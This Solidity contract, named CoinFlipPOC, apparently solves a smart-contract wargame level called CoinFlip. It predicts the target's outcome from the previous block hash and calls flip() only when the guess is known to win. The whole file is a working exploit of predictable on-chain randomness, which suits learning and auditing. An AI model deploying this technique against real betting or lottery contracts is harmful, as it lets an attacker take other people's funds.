// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipPOC {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip coinFlip;
    
    constructor(address _coinFlipContract) {
        coinFlip = CoinFlip(_coinFlipContract);
    }

    function flip() public returns (bool) {
        if (coinFlip.consecutiveWins() >= 10) {
            return false;
        }

        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            return false;
        }

        lastHash = blockValue;
        uint256 cf = blockValue / FACTOR;
        bool side = cf == 1 ? true : false;

        if (side == true) {
            bool r = coinFlip.flip(true);
            if (r == false) {
                revert("Flip failed");
            }

            return true;
        } else {
            return false;
        }
    }
}